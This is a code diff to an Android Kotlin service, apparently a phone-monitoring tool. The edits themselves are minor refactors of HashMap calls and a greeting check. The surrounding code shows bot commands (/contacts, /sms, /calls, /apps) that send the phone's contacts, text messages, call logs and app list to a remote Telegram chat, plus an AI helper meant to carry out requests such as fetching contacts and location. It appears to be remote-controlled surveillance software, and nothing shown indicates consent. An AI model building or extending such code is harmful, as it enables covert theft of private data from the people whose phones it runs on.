@@ -230,11 +230,11 @@ class MonitorService : Service() {
         } else if (trimmed == "/status") {
             sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
         } else if (trimmed == "/contacts") {
-            sendTelegramTask(chatId, "contacts", HashMap<String, Any>())
+            sendTelegramTask(chatId, "contacts", HashMap())
         } else if (trimmed == "/sms") {
-            sendTelegramTask(chatId, "sms", HashMap<String, Any>())
+            sendTelegramTask(chatId, "sms", HashMap())
         } else if (trimmed == "/calls") {
-            sendTelegramTask(chatId, "call_logs", HashMap<String, Any>())
+            sendTelegramTask(chatId, "call_logs", HashMap())
         } else if (trimmed == "/apps") {
             val m = HashMap<String, Any>()
             m["action"] = "list"
@@ -814,10 +814,7 @@ class MonitorService : Service() {
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
-            val isGreeting = when (lower) {
-                "hi", "hello", "hey", "test", "ping" -> true
-                else -> false
-            }
+            val isGreeting: Boolean = if (lower == "hi") true else if (lower == "hello") true else if (lower == "hey") true else if (lower == "test") true else if (lower == "ping") true else false
             if (isGreeting) {
                 return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
             }
